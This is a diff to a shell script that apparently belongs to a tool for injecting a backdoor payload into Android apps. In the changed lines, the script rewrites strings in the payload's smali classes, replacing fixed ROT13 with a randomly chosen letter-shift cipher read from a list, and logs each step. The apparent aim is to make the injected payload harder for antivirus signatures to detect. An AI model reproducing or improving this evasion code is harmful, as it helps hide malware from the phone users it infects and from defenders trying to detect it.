@@ -359,8 +359,8 @@ cat >$MY_PATH/obfuscate.method <<EOL
 
     move-result-object ###REG###
 EOL
-helper_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
-echo "Helper class: $helper_class" >>$LOG_FILE 2>&1
+stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
+echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
 sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
@@ -372,7 +372,14 @@ if [ $rc == 0 ]; then
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
-    replacement=`echo $target |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`
+    trlist_max_line=`wc -l $MY_PATH/lists/trlist.txt |awk '{ print $1 }'`
+    trlist_rand_line=`shuf -i 1-${trlist_max_line} -n 1`
+    trlist_line=`sed "${trlist_rand_line}q;d" $MY_PATH/lists/trlist.txt`
+    shift_count=$(awk '{ print $1 }' <<< $trlist_line)
+    shift_tr_value=$(awk '{ print $2 }' <<< $trlist_line)
+    echo "Shift count: $shift_count" >>$LOG_FILE 2>&1
+    echo "Shift tr value: $shift_tr_value" >>$LOG_FILE 2>&1
+    replacement=`echo $target |tr '[A-Za-z]' $shift_tr_value |sed 's:^":"'"$shift_count"':g'`
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
@@ -395,7 +402,7 @@ if [ $rc == 0 ]; then
   done
   if [ ! -f $MY_PATH/obfuscate.error ]; then
     #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
-    class="$helper_class"
+    class="$stringobfuscator_class"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
   else
